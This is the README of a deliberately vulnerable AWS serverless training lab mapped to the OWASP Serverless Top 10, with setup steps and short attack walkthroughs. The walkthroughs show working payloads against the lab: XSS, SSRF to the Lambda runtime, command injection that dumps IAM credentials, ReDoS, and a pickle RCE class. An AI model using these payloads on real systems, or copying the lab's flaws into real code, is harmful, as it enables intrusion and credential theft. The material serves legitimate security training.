<h1 align="center">Very Vulnerable Serverless Application</h1>

<p align="center">
  by <a href="https://topmate.io/peachycloudsecurity">Anjali &amp; Divyanshu</a> (theshukladuo) at <a href="https://www.youtube.com/@peachycloudsecurity">Peachycloud Security</a>
</p>

<p align="center">
  <img src="https://topmate.io/cdn-cgi/image/width=640,quality=90/https://static.topmate.io/4butNtHixUQEEyRVd1jbyU.png" width="280" alt="Peachy Cloud Security, by The Shukla Duo" />
</p>

<p align="center">
  <a href="https://peachycloudsecurity.com/training/live-bootcamp#all-trainings"><img alt="Trainings" src="https://img.shields.io/badge/Trainings-f0663d?style=for-the-badge&logo=googleclassroom&logoColor=white" /></a>
  <a href="https://www.youtube.com/@peachycloudsecurity"><img alt="YouTube" src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" /></a>
  <a href="https://instagram.com/peachycloudsecurity"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" /></a>
  <a href="https://topmate.io/peachycloudsecurity"><img alt="Topmate" src="https://img.shields.io/badge/Topmate-E44332?style=for-the-badge" /></a>
</p>

<p align="center">
  A deliberately vulnerable serverless application for learning AWS Lambda security testing.<br/>
  Maps to the <b>OWASP Serverless Top 10</b>.
</p>

> [!WARNING]
> Do not deploy this in a production environment. For training, CTF, and authorized security testing only.

---

## OWASP Serverless Top 10 Coverage

| # | Vulnerability | Endpoint | Status |
|---|--------------|----------|--------|
| SLS-1 | Injection (XSS + Command Injection) | `/welcome/<name>`, `/login`, `/date` | ✅ |
| SLS-2 | Broken Authentication | N/A (hardcoded secret key) | ✅ |
| SLS-3 | Sensitive Data Exposure / SSRF | `/redirect?url=` | ✅ |
| SLS-4 | Insecure Deserialization | `/deserial` | ✅ |
| SLS-5 | Broken Access Control | IAM `s3:*` on `*` | ✅ |
| SLS-6 | Security Misconfiguration | `serverless.yml` (env vars, IAM) | ✅ |
| SLS-7 | Cross-Site Scripting (XSS) | `/welcome/<name>` | ✅ |
| SLS-8 | Insecure Third-Party Components | `requirements.txt` | ✅ |
| SLS-9 | Insufficient Logging & Monitoring | No CloudWatch alarms | ✅ |
| SLS-10 | Event Injection / ReDoS | `/redos?string=` | ✅ |

---

## Endpoints

| Method | Path | Vulnerability |
|--------|------|---------------|
| GET | `/` | Landing page |
| GET | `/welcome/<name>` | Injection / XSS |
| POST, GET | `/login` | Injection |
| GET | `/redirect?url=` | SSRF / Lambda runtime access |
| GET | `/date?exec=` | OS Command Injection |
| GET | `/redos?string=` | ReDoS |
| POST | `/deserial` | Insecure Deserialization (pickle RCE) |

---

## Prerequisites

- **AWS CLI** configured with credentials: `aws configure`
- **Python 3.12+**
- **Node.js 18+**
- **Serverless Framework v4**: `npm install -g serverless`
- **Serverless Dashboard account**: `serverless login` (required for v4)
- **httpie** (optional): [httpie.io/cli](https://httpie.io/cli)

---

## Setup

1. **Clone the repo:**
    ```bash
    git clone https://github.com/peachycloudsecurity/very-vulnerable-serverless
    cd very-vulnerable-serverless
    ```

2. **Install dependencies:**
    ```bash
    npm install
    ```

3. **Login to Serverless Dashboard (first time only):**
    ```bash
    serverless login
    ```

4. **Deploy:**
    ```bash
    serverless deploy
    ```

5. **Access the app** at the URL printed in the deploy output.

---

## Attack Walkthroughs

### XSS / Injection
```
Open browser → Enter: "><img src=x onerror=alert('xss')>
```

### SSRF → Lambda Runtime
```bash
curl https://<endpoint>/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
```

### Command Injection → Credential Theft
```bash
# Execute arbitrary commands
curl "https://<endpoint>/date?exec=printenv"

# Steal Lambda IAM credentials, then:
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

### ReDoS
```bash
# Normal (fast):
curl "https://<endpoint>/redos?string=aaaaaab"

# Attack (exponential backtracking → timeout/502):
curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```

### Insecure Deserialization (Pickle RCE)
```python
import pickle, base64, requests

class PickleRCE:
    def __reduce__(self):
        import os
        return (os.system, ('touch /tmp/hacked',))

payload = base64.urlsafe_b64encode(pickle.dumps(PickleRCE())).decode()
requests.post('https://<endpoint>/deserial', data={'pickled': payload})

# Verify:
requests.get('https://<endpoint>/date?exec=ls -la /tmp/hacked')
```

---

## Cleanup

Remove all deployed AWS resources:

```bash
serverless remove
```

This deletes the CloudFormation stack, Lambda function, API Gateway, and associated IAM roles.

---

## Related Projects

- [ClientHub Vulnerable SaaS](https://github.com/peachycloudsecurity/clienthub-vulnerable-saas) — Full multi-tenant SaaS app with OWASP Top 10:2017 vulnerabilities, 2FA bypass, S3 misconfig, and more.
- [Container Security Workshop Lab](https://github.com/peachycloudsecurity/container-security-workshop-lab) — Hands-on Docker and container security workshop.

---

## About Us

- **Anjali** is a seasoned cloud security engineer, experienced in DevSecOps and Kubernetes security (EKS/GKE) as well as AWS, Azure, and GCP security. She is the founder of Container Security Village and Kubernetes Village, communities dedicated to enhancing cloud-native security. As the project lead for OWASP EKS Goat, she focuses on AWS EKS security research and hands-on exploitation paths. Anjali is a recognized AWS Community Builder and actively shares her research through her YouTube channel, @peachycloudsecurity. Her extensive speaking history includes Blackhat USA, Black Hat Spring USA, Black Hat Europe, Nullcon, Seasides Goa, BSides Bangalore, CSA Bangalore, and C0c0n. She has also contributed to the community by volunteering at Cloud Village at DEF CON and various BSides events globally. Reach out at peachycloudsecurity[dot]com

- **Divyanshu** is a senior security engineer, experienced in Cloud Security, Kubernetes Security, DevSecOps, Web Application Pentesting, and Threat Modelling. Reported multiple vulnerabilities to companies like Airbnb, Google, Microsoft, AWS, Apple, Amazon, Samsung, Zomato, Xiaomi, Alibaba, Opera, Protonmail, Mobikwik, etc, and received CVE-2019-8727, CVE-2019-16918, CVE-2019-12278, CVE-2019-14962 for reporting issues. Currently co-lead of OWASP EKS Goat, OWASP GKE Goat, Author of Burp-o-mation and very-vulnerable-serverless. Also part of AWS Community Builder for security and Defcon Cloud Village crew member 2020/2021/2022. Delivered talks at events like Blackhat USA, Europe, Seasides, C0c0n, Nullcon, Brucon, BSides Bangalore and BSides Ahmedabad. Also winner of "Cybersecurity Samurai 2023" at BSides Bangalore 2023 & "Cloud Security Champion" at CSA Bangalore 2023. Reach out at peachycloudsecurity[dot]com

---

## Disclaimer

- The information, commands, and demonstrations presented in this lab are intended strictly for educational purposes. Under no circumstances should they be used to compromise or attack any system outside the boundaries of this educational session unless explicit permission has been granted.

    - <b>This course is provided by the instructors independently and is not endorsed by their employers or any other corporate entity. The content does not necessarily reflect the views or policies of any company or professional organization associated with the instructors.</b>

- **Usage of Training Material**: The training material is provided without warranties or guarantees. Participants are responsible for applying the techniques or methods discussed during the training. The trainers and their respective employers or affiliated companies are not liable for any misuse or misapplication of the information provided.

- **Liability**: The trainers, their employers, and any affiliated companies are not responsible for any direct, indirect, incidental, or consequential damages arising from the use of the information provided. No responsibility is assumed for any injury or damage to persons, property, or systems as a result of using or operating any methods, products, instructions, or ideas discussed during the training.

- **Intellectual Property**: This project and all accompanying materials are the intellectual property of the trainers. They are shared under the GPL-3.0 license, which requires that appropriate credit be given to the trainers whenever the materials are used, modified, or redistributed.

- **Educational Purpose**: This lab is for educational purposes only. Do not attack or test any website or network without proper authorization. The trainers are not liable or responsible for any misuse.

- **Usage Rights**: Individuals are permitted to use this project for instructional purposes, provided that no fees are charged to the students.

---

## License

GNU General Public License v3.0 — see [LICENSE](LICENSE).

Credits: [Python-Pickle-RCE-Exploit](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit)

---

### Contact: **[Peachycloud Security](https://peachycloudsecurity.com)**

## 💝 Support the Project

Your support helps us maintain and improve this project, create more educational content, and continue building open-source security resources for the community.

**Ways to Support:**
- **Subscribe on YouTube** — [youtube.com/@peachycloudsecurity](https://www.youtube.com/@peachycloudsecurity)
- **Sponsor via GitHub** — [GitHub Sponsors](https://github.com/sponsors/peachycloudsecurity)
- **Explore Learning Resources** — Access additional tutorials, walkthroughs, and hands-on labs at [peachycloudsecurity.com](https://peachycloudsecurity.com)
- **Connect & Learn** — Connect with us via [Topmate](https://topmate.io/peachycloudsecurity)

> **Looking for personalized guidance?** Get one-on-one mentorship, interview prep, or custom training sessions through our [Topmate](https://topmate.io/peachycloudsecurity) platform.
